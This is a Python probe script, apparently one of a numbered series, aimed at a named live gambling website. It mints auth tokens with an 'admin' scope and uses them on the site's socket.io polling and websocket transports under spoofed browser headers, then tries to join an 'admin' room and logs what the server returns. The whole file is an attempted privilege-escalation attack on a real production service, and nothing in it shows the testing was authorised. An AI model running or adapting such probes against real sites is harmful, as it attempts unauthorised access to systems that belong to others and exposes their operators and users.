#!/usr/bin/env python3
"""probe28: escalated-scope tokens against real websocket transports (gs polling + ws websocket-upgrade)"""
import base64
import json
import time

import requests
import websocket

BASE = "https://duelbits.com"
UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36")


def hdrs(extra=None):
    h = {
        "User-Agent": UA,
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "en-US,en;q=0.9", "DNT": "1",
        "sec-ch-ua": '"Chromium";v="131", "Not_A Brand";v="24"',
        "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": '"Windows"',
        "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin", "Origin": BASE, "Referer": BASE + "/",
    }
    if extra:
        h.update(extra)
    return h


def mint(scope):
    return requests.post(BASE + f"/auth/token?scope={scope}", headers=hdrs(), timeout=20).json().get("token", "")


def gs_poll_probe(scope):
    tok = mint(scope)
    sid = json.loads(requests.get(f"{BASE}/gs/socket.io/?EIO=4&transport=polling",
                                  headers=hdrs(), timeout=15).text[1:])["sid"]
    pr = requests.post(f"{BASE}/gs/socket.io/?EIO=4&transport=polling&sid={sid}",
                       headers=hdrs({"Content-Type": "text/plain;charset=UTF-8"}),
                       data='40{"token":"' + tok + '"}', timeout=15)
    print(f"--- [gs/{scope}] connect:", pr.status_code, pr.text[:100])
    out = []
    for i in range(2):
        time.sleep(1.2)
        try:
            gr = requests.get(f"{BASE}/gs/socket.io/?EIO=4&transport=polling&sid={sid}",
                              headers=hdrs(), timeout=6)
            out.append(gr.text[:280])
            print(f"--- [gs/{scope}] poll{i}:", gr.status_code, gr.text[:280])
        except requests.exceptions.ReadTimeout:
            print(f"--- [gs/{scope}] poll{i}: long-poll no-data")
            break
    return out


def ws_ws_probe(scope, joins=()):
    tok = mint(scope)
    ws = websocket.WebSocket(timeout=8)
    try:
        ws.connect(f"wss://duelbits.com/ws/socket.io/?EIO=4&transport=websocket",
                   header=[f"Origin: {BASE}", f"User-Agent: {UA}",
                           "Accept-Language: en-US,en;q=0.9"])
        print(f"--- [ws/{scope}] upgrade ok")
        print("--- [ws] first:", ws.recv()[:120])
        ws.send('40{"token":"' + tok + '"}')
        for i in range(4):
            try:
                f = ws.recv()
                print(f"--- [ws/{scope}] frame{i}:", str(f)[:300])
                if str(f).startswith("44"):
                    break
            except Exception as e:
                print(f"--- [ws/{scope}] recv{i}: {str(e)[:80]}")
                break
        for j in joins:
            try:
                ws.send(j)
                f = ws.recv()
                print(f"--- [ws/{scope}] join resp:", str(f)[:280])
            except Exception as e:
                print(f"--- [ws/{scope}] join {j[:36]}: {str(e)[:70]}")
                break
        ws.close()
    except Exception as e:
        print(f"--- [ws/{scope}]: ERR {str(e)[:130]}")


gs_poll_probe("admin")
time.sleep(5)
ws_ws_probe("ws")
time.sleep(5)
ws_ws_probe("admin", joins=('42["join",["admin"]]',))
